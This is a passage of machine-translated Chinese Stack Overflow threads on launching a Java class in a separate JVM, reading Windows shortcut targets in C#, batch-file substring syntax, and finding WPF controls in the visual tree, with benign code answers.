> |||getFrame(SwingSet2@3d12a6)
> |||getFrame=javax.swing.JFrame@cb01e3
> |||getFrame(SwingSet2@3d12a6)
> |||getFrame=javax.swing.JFrame@cb01e3
> ||createSplashScreen
> .run(SwingSet2$1@fba2af)
> ..showSplashScreen(SwingSet2@ 3d12a6)
> ...isApplet(SwingSet2@3d12a6)
> ...isApplet=false
> ..showSplashScreen
> .run
> ||initializeDemo(SwingSet2@3d12a6)
> |||createMenus(SwingSet2@3d12a6)
> ||||getString(SwingSet2@3d12a6, " MenuBar.accessible_description")
> |||||getResourceBundle(SwingSet2@3d12a6)
> |||||getResourceBundle=java.util.PropertyResourceBundle@6989e
> ||||getString="Swing 演示菜单栏"

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-05-09T05:17:38.510

XMLEncoder 只对 bean 属性进行编码，而 equals 显然可以处理非 bean 和任何内部字段。

部分问题是您不知道 equals 实际在看什么。一个对象可能有许多不同的字段，但仍然声称它与其他对象相等，甚至可能是不同的类型。（例如，自定义 URL 类可能会为等于其外部形式的字符串返回 true）。

因此，我认为没有[字节码检测](http://java.sun.com/j2se/1.5.0/docs/api/java/lang/instrument/package-summary.html)是不可能的，您可以在其中实际修改类 equals() 函数以查看它访问的字段。即便如此，要“真正”知道为什么函数返回 false 仍然非常困难。但希望这将是一个比较在 equals() 中实际访问的字段的简单问题

# java - 在单独的进程中执行 Java 应用程序

> ID：636367
> 
> 赞同：53
> 
> 时间：2009-03-11T21:06:03.427
> 
> 标签：java, process, exec

Java 应用程序能否以独立于平台的方式使用其名称而不是其位置加载到单独的进程中？

我知道您可以通过...执行程序

```
Process process = Runtime.getRuntime().exec( COMMAND ); 
```

...这种方法的主要问题是此类调用是特定于平台的。

理想情况下，我会将一个方法包装成简单的东西......

```
EXECUTE.application( CLASS_TO_BE_EXECUTED ); 
```

...并将应用程序类的完全限定名称作为`CLASS_TO_BE_EXECUTED`.

* * *

## 回答 #1

> 赞同：79
> 
> 时间：2009-04-07T01:53:33.810

这是对已提供的其他一些答案的综合。Java 系统属性提供了足够的信息来提出 java 命令的路径和类路径，我认为这是一种独立于平台的方式。

```
public final class JavaProcess {

    private JavaProcess() {}        

    public static int exec(Class klass, List<String> args) throws IOException,
                                               InterruptedException {
        String javaHome = System.getProperty("java.home");
        String javaBin = javaHome +
                File.separator + "bin" +
                File.separator + "java";
        String classpath = System.getProperty("java.class.path");
        String className = klass.getName();

        List<String> command = new LinkedList<String>();
        command.add(javaBin);
        command.add("-cp");
        command.add(classpath);
        command.add(className);
        if (args != null) {
            command.addAll(args);
        }

        ProcessBuilder builder = new ProcessBuilder(command);

        Process process = builder.inheritIO().start();
        process.waitFor();
        return process.exitValue();
    }

} 
```

你会像这样运行这个方法：

```
int status = JavaProcess.exec(MyClass.class, args); 
```

我认为传递实际类而不是名称的字符串表示形式是有意义的，因为无论如何该类必须在类路径中才能正常工作。

* * *

## 回答 #2

> 赞同：46
> 
> 时间：2009-03-12T02:26:45.043

两个提示：

`System.getProperty("java.home") + "/bin/java"`为您提供 java 可执行文件的路径。

`((URLClassLoader) Thread.currentThread().getContextClassLoader()).getURL()`帮助您重建当前应用程序的类路径。

那么你`EXECUTE.application`就是（伪代码）：

`Process.exec(javaExecutable, "-classpath", urls.join(":"), CLASS_TO_BE_EXECUTED)`

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2016-02-08T17:40:07.367

扩展@stepancheg 的答案，实际代码看起来像这样（以测试的形式）。

```
import org.junit.Test;

import java.io.File;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Arrays;
import java.util.stream.Collectors;

public class SpinningUpAJvmTest {
    @Test
    public void shouldRunAJvm() throws Exception {
        String classpath = Arrays.stream(((URLClassLoader) Thread.currentThread().getContextClassLoader()).getURLs())
                .map(URL::getFile)
                .collect(Collectors.joining(File.pathSeparator));
        Process process = new ProcessBuilder(
                System.getProperty("java.home") + "/bin/java",
                "-classpath",
                classpath,
                MyMainClass.class.getName()
                // main class arguments go here
        )
                .inheritIO()
                .start();
        int exitCode = process.waitFor();
        System.out.println("process stopped with exitCode " + exitCode);
    }
} 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-04-12T05:44:47.370

这对你来说可能有点矫枉过正，但[Project Akuma 可以满足](https://github.com/kohsuke/akuma)你的需求，甚至更多。我通过Kohsuke（Sun 的摇滚创业程序员之一）的[这篇文章发现了它非常有用的博客。](http://weblogs.java.net/blog/kohsuke/archive/2009/01/writing_a_unix.html)

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-03-12T00:26:55.427

你真的必须在本地启动它们吗？你能直接调用他们的“主要”方法吗？main 唯一的特别之处是 VM 启动器调用它，没有什么能阻止你自己调用 main。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2009-04-05T10:15:41.093

```
public abstract class EXECUTE {

    private EXECUTE() { /* Procedural Abstract */ }

    public static Process application( final String CLASS_TO_BE_EXECUTED ) {

        final String EXEC_ARGUMENT 
        = new StringBuilder().
              append( java.lang.System.getProperty( "java.home" ) ).
              append( java.io.File.separator ).
              append( "bin" ).
              append( java.io.File.separator ).
              append( "java" ).
              append( " " ).
              append( new java.io.File( "." ).getAbsolutePath() ).
              append( java.io.File.separator ).
              append( CLASS_TO_BE_EXECUTED ).
              toString();

        try {       

            return Runtime.getRuntime().exec( EXEC_ARGUMENT );

        } catch ( final Exception EXCEPTION ) {     

            System.err.println( EXCEPTION.getStackTrace() );
        }

        return null;
    }
} 
```

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2009-04-06T20:19:53.333

你检查过 ProcessBuilder API 吗？它从 1.5 开始可用

[http://java.sun.com/javase/6/docs/api/java/lang/ProcessBuilder.html](http://java.sun.com/javase/6/docs/api/java/lang/ProcessBuilder.html)

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2009-04-06T16:01:11.613

按照 TofuBeer 的说法：你确定你真的需要分叉另一个 JVM 吗？如今，JVM 对并发性的支持非常好，因此您可以通过分离一两个新线程（可能需要也可能不需要调用 Foo#main(String[])）以相对便宜的价格获得很多功能。查看 java.util.concurrent 了解更多信息。

如果你决定分叉，你会为自己设置一些与查找所需资源相关的复杂性。也就是说，如果您的应用程序经常更改并且依赖于一堆 jar 文件，则您需要跟踪它们，以便将它们传递给类路径 arg。此外，这种方法需要推断（当前执行的）JVM 的位置（可能不准确）和当前类路径的位置（更不可能准确，具体取决于生成的方式）线程已被调用 - jar、jnlp、爆炸的 .classes 目录、一些容器等）。

另一方面，链接到静态#main 方法也有其缺陷。静态修饰符有泄漏到其他代码中的令人讨厌的趋势，并且通常被具有设计意识的人所反对。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-11-03T07:45:49.027

当您从 java GUI 运行它时出现的一个问题是它在后台运行。所以你根本看不到命令​​提示符。

要解决这个问题，您必须通过“cmd.exe”和“start”运行 java.exe。我不知道为什么，但如果你把“cmd /c start”放在前面，它会在运行时显示命令提示符。

但是，“开始”的问题在于，如果应用程序的路径中有空格（java exe 的路径通常有，因为它在 C:\Program Files\Java\jre6\bin\java.exe或类似），然后启动失败并显示“找不到 c:\Program”

所以你必须在 C:\Program Files\Java\jre6\bin\java.exe 周围加上引号 现在开始抱怨你传递给 java.exe 的参数：“系统找不到文件 -cp。”

用反斜杠转义“程序文件”中的空格也不起作用。所以这个想法是不使用空间。生成一个带有 bat 扩展名的临时文件，然后将带有空格的命令放在那里并运行 bat。但是，通过 start 运行 bat，完成后不会退出，因此您必须将“exit”放在批处理文件的末尾。

这看起来还是很恶心。

因此，在寻找替代方案时，我发现在“程序文件”的空间中使用引号空间引号实际上可以与 start 一起使用。

在上面的 EXECUTE 类中，将字符串生成器附加到：

```
append( "cmd /C start \"Some title\" " ).
append( java.lang.System.getProperty( "java.home" ).replaceAll(" ", "\" \"") ).
append( java.io.File.separator ).
append( "bin" ).
append( java.io.File.separator ).
append( "java" ).
append( " " ).
append( new java.io.File( "." ).getAbsolutePath() ).
append( java.io.File.separator ).
append( CLASS_TO_BE_EXECUTED ). 
```

# c# - 有没有办法在不使用 COM 的情况下在 C# 中以编程方式遵循 Windows 文件系统快捷方式？

> ID：636379
> 
> 赞同：5
> 
> 时间：2009-03-11T21:07:42.753
> 
> 标签：c#, windows, shortcuts

回到 .NET 1.0 天，我写了一个方法来返回 MS Windows 上快捷方式的目标。它通过使用与 Windows 脚本宿主对象模型的互操作并通过 COM 接口强制执行此操作：

```
private FileInfo GetFileFromShortcut(FileInfo shortcut)
{
    FileInfo targetFile = null;

    try
    {
        IWshRuntimeLibrary.WshShell wShell = new IWshRuntimeLibrary.WshShellClass();
        IWshRuntimeLibrary.WshShortcut wShortcut = (IWshRuntimeLibrary.WshShortcut)wShell.CreateShortcut(shortcut.FullName);

        // if the file wasn't a shortcut then the TargetPath comes back empty
        string targetName = wShortcut.TargetPath;
        if (targetName.Length > 0)
        {
            targetFile = new FileInfo(targetName);
        }
    }
    catch (Exception)
    { // will return a null targetFile if anything goes wrong
    }

    return targetFile;
} 
```

这仍然困扰着我，我希望用更优雅的东西来替换它，但前提是替换实际上至少也能正常工作。我仍然找不到找到快捷方式目标的原生 C# 方法。有没有，或者这仍然是做这类事情的最佳方式？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-23T00:39:20.687

你不能只打开 .lnk 或 .url 文件并解析它吗？

这谈到了同样的事情并显示了文件的样子： [http ://www.programmingtalk.com/showthread.php?t=7335](http://www.programmingtalk.com/showthread.php?t=7335)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-11T21:16:07.897

看起来有人在 C# 中编写了一个名为[ShellLink](http://vbaccelerator.com/home/NET/Code/Libraries/Shell_Projects/Creating_and_Modifying_Shortcuts/article.asp)的类来操作快捷方式文件，但它也使用了 COM。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2010-11-22T05:31:13.467

不久前我也对这个感兴趣。

这是已接受的[响应](https://stackoverflow.com/questions/3425969/general-approach-to-reading-lnk-files)，其中包含指向LNK 文件格式的（非正式）[描述的链接。](http://www.stdlib.com/art6-Shortcut-File-Format-lnk.html)显然，所有可用的方法*都*需要通过一些 API。

# batch-file - 在批处理文件中执行子字符串的最佳方法是什么？

> ID：636381
> 
> 赞同：213
> 
> 时间：2009-03-11T21:08:16.307
> 
> 标签：batch-file, substring

我想获取当前正在运行的批处理文件的名称，**不带**文件扩展名。

感谢[这个链接](https://stackoverflow.com/questions/343518/finding-out-the-file-name-of-the-running-batch-file)，我有了**带有**扩展名的文件名......但是在批处理文件中执行子字符串的最佳方法是什么？

还是有另一种方法来获取不带扩展名的文件名？

在这种情况下，假设 3 个字母扩展是安全的。

* * *

## 回答 #1

> 赞同：431
> 
> 时间：2009-03-11T21:11:12.633

好吧，为了获取批处理的文件名，最简单的方法就是使用`%~n0`.

```
@echo %~n0 
```

将输出当前运行的批处理文件的名称（不带扩展名）（除非在由 调用的子例程中执行`call`）。可以`help for`在帮助的最后找到此类“特殊”路径名替换的完整列表：

> 此外，增强了 FOR 变量引用的替换。您现在可以使用以下可选语法：
> 
> ```
> %~I         - expands %I removing any surrounding quotes (")
> %~fI        - expands %I to a fully qualified path name
> %~dI        - expands %I to a drive letter only
> %~pI        - expands %I to a path only
> %~nI        - expands %I to a file name only
> %~xI        - expands %I to a file extension only
> %~sI        - expanded path contains short names only
> %~aI        - expands %I to file attributes of file
> %~tI        - expands %I to date/time of file
> %~zI        - expands %I to size of file
> %~$PATH:I   - searches the directories listed in the PATH
>                environment variable and expands %I to the
>                fully qualified name of the first one found.
>                If the environment variable name is not
>                defined or the file is not found by the
>                search, then this modifier expands to the
>                empty string 
> ```
> 
> 可以组合修饰符以获得复合结果：
> 
> ```
> %~dpI       - expands %I to a drive letter and path only
> %~nxI       - expands %I to a file name and extension only
> %~fsI       - expands %I to a full path name with short names only 
> ```

但是，要准确回答您的问题：子字符串使用以下`:~start,length`符号完成：

```
%var:~10,5% 
```

将从环境变量中的位置 10 中提取 5 个字符`%var%`。

**注意：**字符串的索引是从零开始的，所以第一个字符在位置 0，第二个在 1，依此类推。

要获取参数变量的子字符串，例如`%0`,`%1`等，您必须首先使用以下方法将它们分配给普通环境变量`set`：

```
:: Does not work:
@echo %1:~10,5

:: Assign argument to local variable first:
set var=%1
@echo %var:~10,5% 
```

语法更强大：

*   `%var:~-7%`从中提取最后 7 个字符`%var%`
*   `%var:~0,-4%`将提取除最后四个字符之外的所有字符，这也会使您摆脱文件扩展名（假设句点 [ `.`] 后有三个字符）。

有关`help set`该语法的详细信息，请参阅。

* * *

## 回答 #2

> 赞同：42
> 
> 时间：2012-02-03T07:51:05.753

上面解释的很好！

对于所有可能像我一样在本地化 Windows 中工作的人（我的是斯洛伐克的 XP），您可以尝试`%`将`!`

所以：

```
SET TEXT=Hello World
SET SUBSTRING=!TEXT:~3,5!
ECHO !SUBSTRING! 
```

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2012-06-18T06:46:42.197

作为乔伊答案的附加信息，在`set /?`nor的帮助中没有描述`for /?`。

`%~0`扩展为自己的批次的名称，与输入的完全相同。
因此，如果您开始批处理，它将扩展为

```
%~0   - mYbAtCh
%~n0  - mybatch
%~nx0 - mybatch.bat 
```

但是有一个例外，在子程序中展开可能会失败

```
echo main- %~0
call :myFunction
exit /b

:myFunction
echo func - %~0
echo func - %~n0
exit /b 
```

这导致

```
main - myBatch
Func - :myFunction
func - mybatch 
```

**在函数`%~0`中总是扩展为函数的名称，而不是批处理文件的名称。**
但是，如果您使用至少一个修饰符，它将再次显示文件名！

# wpf - 如何按名称或类型查找 WPF 控件？

> ID：636383
> 
> 赞同：285
> 
> 时间：2009-03-11T21:08:25.043
> 
> 标签：wpf, controls, find

我需要在 WPF 控件层次结构中搜索与给定名称或类型匹配的控件。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：332
> 
> 时间：2009-11-18T23:42:25.657

我将 John Myczek 使用的模板格式和上面的 Tri Q 算法结合起来创建了一个可以在任何父级上使用的 findChild 算法。请记住，向下递归搜索树可能是一个漫长的过程。我只是在 WPF 应用程序上对此进行了抽查，请对您可能发现的任何错误发表评论，我将更正我的代码。

[WPF Snoop](https://github.com/cplotts/snoopwpf)是查看可视化树的有用工具 - 我强烈建议在测试时使用它或使用此算法检查您的工作。

**Tri Q 的算法有一个小错误。**找到孩子后，如果 childrenCount > 1 并且我们再次迭代，我们可以覆盖正确找到的孩子。因此，我在`if (foundChild != null) break;`代码中添加了一个来处理这种情况。

```
/// <summary>
/// Finds a Child of a given item in the visual tree. 
/// </summary>
/// <param name="parent">A direct parent of the queried item.</param>
/// <typeparam name="T">The type of the queried item.</typeparam>
/// <param name="childName">x:Name or Name of child. </param>
/// <returns>The first parent item that matches the submitted type parameter. 
/// If not matching item can be found, 
/// a null parent is being returned.</returns>
public static T FindChild<T>(DependencyObject parent, string childName)
   where T : DependencyObject
{    
  // Confirm parent and childName are valid. 
  if (parent == null) return null;

  T foundChild = null;

  int childrenCount = VisualTreeHelper.GetChildrenCount(parent);
  for (int i = 0; i < childrenCount; i++)
  {
    var child = VisualTreeHelper.GetChild(parent, i);
    // If the child is not of the request child type child
    T childType = child as T;
    if (childType == null)
    {
      // recursively drill down the tree
      foundChild = FindChild<T>(child, childName);

      // If the child is found, break so we do not overwrite the found child. 
      if (foundChild != null) break;
    }
    else if (!string.IsNullOrEmpty(childName))
    {
      var frameworkElement = child as FrameworkElement;
      // If the child's name is set for search
      if (frameworkElement != null && frameworkElement.Name == childName)
      {
        // if the child's name is of the request name
        foundChild = (T)child;
        break;
      }
    }
    else
    {
      // child element found.
      foundChild = (T)child;
      break;
    }
  }

  return foundChild;
} 
```

像这样称呼它：

```
TextBox foundTextBox = 
   UIHelper.FindChild<TextBox>(Application.Current.MainWindow, "myTextBoxName"); 
```

注意`Application.Current.MainWindow`可以是任何父窗口。

* * *

## 回答 #2

> 赞同：158
> 
> 时间：2009-09-25T12:48:51.857

您还可以使用[FrameworkElement.FindName(string)](https://docs.microsoft.com/en-us/dotnet/api/system.windows.frameworkelement.findname)按名称查找元素。

鉴于：

```
<UserControl ...>
    <TextBlock x:Name="myTextBlock" />
</UserControl> 
```

在代码隐藏文件中，您可以编写：

```
var myTextBlock = (TextBlock)this.FindName("myTextBlock"); 
```

当然，因为它是使用 x:Name 定义的，所以您可以只引用生成的字段，但也许您希望动态而不是静态地查找它。

这种方法也可用于模板，其中命名项目出现多次（每次使用模板一次）。

* * *

## 回答 #3

> 赞同：70
> 
> 时间：2009-03-11T21:28:37.663

您可以使用[VisualTreeHelper](http://msdn.microsoft.com/en-us/library/system.windows.media.visualtreehelper.aspx)来查找控件。下面是使用 VisualTreeHelper 查找指定类型的父控件的方法。您也可以使用 VisualTreeHelper 以其他方式查找控件。

```
public static class UIHelper
{
   /// <summary>
   /// Finds a parent of a given item on the visual tree.
   /// </summary>
   /// <typeparam name="T">The type of the queried item.</typeparam>
   /// <param name="child">A direct or indirect child of the queried item.</param>
   /// <returns>The first parent item that matches the submitted type parameter. 
   /// If not matching item can be found, a null reference is being returned.</returns>
   public static T FindVisualParent<T>(DependencyObject child)
     where T : DependencyObject
   {
      // get parent item
      DependencyObject parentObject = VisualTreeHelper.GetParent(child);

      // we’ve reached the end of the tree
      if (parentObject == null) return null;

      // check if the parent matches the type we’re looking for
      T parent = parentObject as T;
      if (parent != null)
      {
         return parent;
      }
      else
      {
         // use recursion to proceed with next level
         return FindVisualParent<T>(parentObject);
      }
   }
} 
```

像这样称呼它：

```
Window owner = UIHelper.FindVisualParent<Window>(myControl); 
```

* * *

## 回答 #4

> 赞同：22
> 
> 时间：2009-10-01T00:52:54.687

我可能只是在重复其他人，但我确实有一段漂亮的代码，它使用 FindChild() 方法扩展 DependencyObject 类，该方法将通过类型和名称为您获取孩子。只需包含并使用。

```
public static class UIChildFinder
{
    public static DependencyObject FindChild(this DependencyObject reference, string childName, Type childType)
    {
        DependencyObject foundChild = null;
        if (reference != null)
        {
            int childrenCount = VisualTreeHelper.GetChildrenCount(reference);
            for (int i = 0; i < childrenCount; i++)
            {
                var child = VisualTreeHelper.GetChild(reference, i);
                // If the child is not of the request child type child
                if (child.GetType() != childType)
                {
                    // recursively drill down the tree
                    foundChild = FindChild(child, childName, childType);
                    if (foundChild != null) break;
                }
                else if (!string.IsNullOrEmpty(childName))
                {
                    var frameworkElement = child as FrameworkElement;
                    // If the child's name is set for search
                    if (frameworkElement != null && frameworkElement.Name == childName)
                    {
                        // if the child's name is of the request name
                        foundChild = child;
                        break;
                    }
                }
                else
                {
                    // child element found.
                    foundChild = child;
                    break;
                }
            }
        }
        return foundChild;
    }
} 
```

希望你觉得它有用。

* * *

## 回答 #5

> 赞同：19
> 
> 时间：2012-02-10T14:23:23.087

如果您想查找特定类型的所有控件，您可能也对此片段感兴趣

```
 public static IEnumerable<T> FindVisualChildren<T>(DependencyObject parent) 
        where T : DependencyObject
    {
        int childrenCount = VisualTreeHelper.GetChildrenCount(parent);
        for (int i = 0; i < childrenCount; i++)
        {
            var child = VisualTreeHelper.GetChild(parent, i);

            var childType = child as T;
            if (childType != null)
            {
                yield return (T)child;
            }

            foreach (var other in FindVisualChildren<T>(child))
            {
                yield return other;
            }
        }
    } 
```

* * *

## 回答 #6

> 赞同：18
> 
> 时间：2010-04-20T08:10:18.370

我对代码的扩展。

*   添加重载以按类型、按类型和条件（谓词）查找一个子项，查找符合条件的所有类型的子项
*   FindChildren 方法除了是 DependencyObject 的扩展方法外，还是一个迭代器
*   FindChildren 也会遍历逻辑子树。请参阅博客文章中链接的 Josh Smith 的文章。

来源： [https ://code.google.com/p/gishu-util/source/browse/#git%2FWPF%2FUtilities](https://code.google.com/p/gishu-util/source/browse/#git%2FWPF%2FUtilities)

解释性博客文章： http: [//madcoderspeak.blogspot.com/2010/04/wpf-find-child-control-of-specific-type.html](http://madcoderspeak.blogspot.com/2010/04/wpf-find-child-control-of-specific-type.html)

* * *

## 回答 #7

> 赞同：16
> 
> 时间：2009-06-25T09:40:10.950

这将消除一些元素 - 您应该像这样扩展它以支持更广泛的控件。对于一个简短的讨论，看看[这里](http://www.hardcodet.net/2008/02/find-wpf-parent)

```
 /// <summary>
 /// Helper methods for UI-related tasks.
 /// </summary>
 public static class UIHelper
 {
   /// <summary>
   /// Finds a parent of a given item on the visual tree.
   /// </summary>
   /// <typeparam name="T">The type of the queried item.</typeparam>
   /// <param name="child">A direct or indirect child of the
   /// queried item.</param>
   /// <returns>The first parent item that matches the submitted
   /// type parameter. If not matching item can be found, a null
   /// reference is being returned.</returns>
   public static T TryFindParent<T>(DependencyObject child)
     where T : DependencyObject
   {
     //get parent item
     DependencyObject parentObject = GetParentObject(child);

     //we've reached the end of the tree
     if (parentObject == null) return null;

     //check if the parent matches the type we're looking for
     T parent = parentObject as T;
     if (parent != null)
     {
       return parent;
     }
     else
     {
       //use recursion to proceed with next level
       return TryFindParent<T>(parentObject);
     }
   }

   /// <summary>
   /// This method is an alternative to WPF's
   /// <see cref="VisualTreeHelper.GetParent"/> method, which also
   /// supports content elements. Do note, that for content element,
   /// this method falls back to the logical tree of the element!
   /// </summary>
   /// <param name="child">The item to be processed.</param>
   /// <returns>The submitted item's parent, if available. Otherwise
   /// null.</returns>
   public static DependencyObject GetParentObject(DependencyObject child)
   {
     if (child == null) return null;
     ContentElement contentElement = child as ContentElement;

     if (contentElement != null)
     {
       DependencyObject parent = ContentOperations.GetParent(contentElement);
       if (parent != null) return parent;

       FrameworkContentElement fce = contentElement as FrameworkContentElement;
       return fce != null ? fce.Parent : null;
     }

     //if it's not a ContentElement, rely on VisualTreeHelper
     return VisualTreeHelper.GetParent(child);
   }
} 
```

* * *

## 回答 #8

> 赞同：16
> 
> 时间：2010-06-10T13:57:32.390

我编辑了 CrimsonX 的代码，因为它不适用于超类类型：

```
public static T FindChild<T>(DependencyObject depObj, string childName)
   where T : DependencyObject
{
    // Confirm obj is valid. 
    if (depObj == null) return null;

    // success case
    if (depObj is T && ((FrameworkElement)depObj).Name == childName)
        return depObj as T;

    for (int i = 0; i < VisualTreeHelper.GetChildrenCount(depObj); i++)
    {
        DependencyObject child = VisualTreeHelper.GetChild(depObj, i);

        //DFS
        T obj = FindChild<T>(child, childName);

        if (obj != null)
            return obj;
    }

    return null;
} 
```

* * *

## 回答 #9

> 赞同：14
> 
> 时间：2011-09-06T12:31:17.443

虽然我总体上喜欢递归，但在 C# 中编程时它不如迭代高效，所以也许以下解决方案比 John Myczek 建议的解决方案更简洁？这会从给定控件向上搜索层次结构，以找到特定类型的祖先控件。

```
public static T FindVisualAncestorOfType<T>(this DependencyObject Elt)
    where T : DependencyObject
{
    for (DependencyObject parent = VisualTreeHelper.GetParent(Elt);
        parent != null; parent = VisualTreeHelper.GetParent(parent))
    {
        T result = parent as T;
        if (result != null)
            return result;
    }
    return null;
} 
```

像这样调用它以找到`Window`包含一个名为的控件`ExampleTextBox`：

```
Window window = ExampleTextBox.FindVisualAncestorOfType<Window>(); 
```

* * *

## 回答 #10

> 赞同：9
> 
> 时间：2010-10-20T10:17:24.867

这是我的代码，用于按类型查找控件，同时控制我们进入层次结构的深度（maxDepth == 0 表示无限深）。

```
public static class FrameworkElementExtension
{
    public static object[] FindControls(
        this FrameworkElement f, Type childType, int maxDepth)
    {
        return RecursiveFindControls(f, childType, 1, maxDepth);
    }

    private static object[] RecursiveFindControls(
        object o, Type childType, int depth, int maxDepth = 0)
    {
        List<object> list = new List<object>();
        var attrs = o.GetType()
            .GetCustomAttributes(typeof(ContentPropertyAttribute), true);
        if (attrs != null && attrs.Length > 0)
        {
            string childrenProperty = (attrs[0] as ContentPropertyAttribute).Name;
            foreach (var c in (IEnumerable)o.GetType()
                .GetProperty(childrenProperty).GetValue(o, null))
            {
                if (c.GetType().FullName == childType.FullName)
                    list.Add(c);
                if (maxDepth == 0 || depth < maxDepth)
                    list.AddRange(RecursiveFindControls(
                        c, childType, depth + 1, maxDepth));
            }
        }
        return list.ToArray();
    }
} 
```

* * *

## 回答 #11

> 赞同：9
> 
> 时间：2011-06-06T23:26:57.030

exciton80 ...我遇到了您的代码没有通过用户控件递归的问题。它击中了 Grid 根并引发了错误。我相信这为我解决了这个问题：

```
public static object[] FindControls(this FrameworkElement f, Type childType, int maxDepth)
{
    return RecursiveFindControls(f, childType, 1, maxDepth);
}

private static object[] RecursiveFindControls(object o, Type childType, int depth, int maxDepth = 0)
{
    List<object> list = new List<object>();
    var attrs = o.GetType().GetCustomAttributes(typeof(ContentPropertyAttribute), true);
    if (attrs != null && attrs.Length > 0)
    {
        string childrenProperty = (attrs[0] as ContentPropertyAttribute).Name;
        if (String.Equals(childrenProperty, "Content") || String.Equals(childrenProperty, "Children"))
        {
            var collection = o.GetType().GetProperty(childrenProperty).GetValue(o, null);
            if (collection is System.Windows.Controls.UIElementCollection) // snelson 6/6/11
            {
                foreach (var c in (IEnumerable)collection)
                {
                    if (c.GetType().FullName == childType.FullName)
                        list.Add(c);
                    if (maxDepth == 0 || depth < maxDepth)
                        list.AddRange(RecursiveFindControls(
                            c, childType, depth + 1, maxDepth));
                }
            }
            else if (collection != null && collection.GetType().BaseType.Name == "Panel") // snelson 6/6/11; added because was skipping control (e.g., System.Windows.Controls.Grid)
            {
                if (maxDepth == 0 || depth < maxDepth)
                    list.AddRange(RecursiveFindControls(
                        collection, childType, depth + 1, maxDepth));
            }
        }
    }
    return list.ToArray();
} 
```

* * *

## 回答 #12

> 赞同：8
> 
> 时间：2014-08-20T15:45:01.940

我有一个这样的序列函数（这是完全通用的）：

```
 public static IEnumerable<T> SelectAllRecursively<T>(this IEnumerable<T> items, Func<T, IEnumerable<T>> func)
    {
        return (items ?? Enumerable.Empty<T>()).SelectMany(o => new[] { o }.Concat(SelectAllRecursively(func(o), func)));
    } 
```

获得直系子女：

```
 public static IEnumerable<DependencyObject> FindChildren(this DependencyObject obj)
    {
        return Enumerable.Range(0, VisualTreeHelper.GetChildrenCount(obj))
            .Select(i => VisualTreeHelper.GetChild(obj, i));
    } 
```

查找层次结构树下的所有孩子：

```
 public static IEnumerable<DependencyObject> FindAllChildren(this DependencyObject obj)
    {
        return obj.FindChildren().SelectAllRecursively(o => o.FindChildren());
    } 
```

您可以在 Window 上调用它来获取所有控件。

有了集合之后，就可以使用LINQ（即OfType，Where）了。

* * *

## 回答 #13

> 赞同：6
> 
> 时间：2011-03-06T13:03:18.413

由于这个问题很笼统，它可能会吸引人们寻找非常琐碎案例的答案：如果您只想要一个孩子而不是后代，您可以使用 Linq：

```
private void ItemsControlItem_Loaded(object sender, RoutedEventArgs e)
{
    if (SomeCondition())
    {
        var children = (sender as Panel).Children;
        var child = (from Control child in children
                 where child.Name == "NameTextBox"
                 select child).First();
        child.Focus();
    }
} 
```

或者当然是明显的 for 循环遍历儿童。

* * *

## 回答 #14

> 赞同：4
> 
> 时间：2015-04-02T15:04:21.537

这些选项已经讨论了在 C# 中遍历可视化树。也可以使用 RelativeSource 标记扩展来遍历 xaml 中的可视化树。[微软](https://msdn.microsoft.com/en-us/library/dd553635(v=vs.95).aspx)

按类型查找

```
Binding="{Binding RelativeSource={RelativeSource Mode=FindAncestor, AncestorType={x:Type <TypeToFind>}}}" 
```

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2015-09-09T15:54:59.930

这是一个使用灵活谓词的解决方案：

```
public static DependencyObject FindChild(DependencyObject parent, Func<DependencyObject, bool> predicate)
{
    if (parent == null) return null;

    int childrenCount = VisualTreeHelper.GetChildrenCount(parent);
    for (int i = 0; i < childrenCount; i++)
    {
        var child = VisualTreeHelper.GetChild(parent, i);

        if (predicate(child))
        {
            return child;
        }
        else
        {
            var foundChild = FindChild(child, predicate);
            if (foundChild != null)
                return foundChild;
        }
    }

    return null;
} 
```

例如，您可以这样称呼它：

```
var child = FindChild(parent, child =>
{
    var textBlock = child as TextBlock;
    if (textBlock != null && textBlock.Name == "MyTextBlock")
        return true;
    else
        return false;
}) as TextBlock; 
```

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2021-03-15T02:05:41.223

我无法使用 @CrimsonX 或 @Drew Noakes 方法找到我的控件，因为我的 ControlTemplate 位于单独的 XAML 文件中。我使用以下方法找到了控件：

```
private Image backImage;
private void Diagram_Loaded(object sender, System.Windows.RoutedEventArgs e)
{
    // here is the example of the ControlTemplate declaration
    //<ControlTemplate x:Key="DiagramControlTemplate1" TargetType="{x:Type Diagram}">
    var ctrlTemplate = (ControlTemplate)FindResource("DiagramControlTemplate1");
    // diagram is the x:Name of TemplatedControl and, "backImage" is the name of control that I want to find.
    var imageControl = ctrlTemplate.FindName("backImage", diagram);
    if (imageControl != null)
    {
        this.backImage = (Image)imageControl;
    }
} 
```

这对我有用。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2017-03-07T12:54:57.223

要从代码中查找给定类型的祖先，您可以使用：

```
[CanBeNull]
public static T FindAncestor<T>(DependencyObject d) where T : DependencyObject
{
    while (true)
    {
        d = VisualTreeHelper.GetParent(d);

        if (d == null)
            return null;

        var t = d as T;

        if (t != null)
            return t;
    }
} 
```

此实现使用迭代而不是递归，这可能会稍微快一些。

如果您使用的是 C# 7，则可以稍微缩短一点：

```
[CanBeNull]
public static T FindAncestor<T>(DependencyObject d) where T : DependencyObject
{
    while (true)
    {
        d = VisualTreeHelper.GetParent(d);

        if (d == null)
            return null;

        if (d is T t)
            return t;
    }
} 
```

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2017-11-21T21:17:55.353

这段代码只是修复了@CrimsonX 答案的错误：

```
 public static T FindChild<T>(DependencyObject parent, string childName)
       where T : DependencyObject
    {    
      // Confirm parent and childName are valid. 
      if (parent == null) return null;

      T foundChild = null;

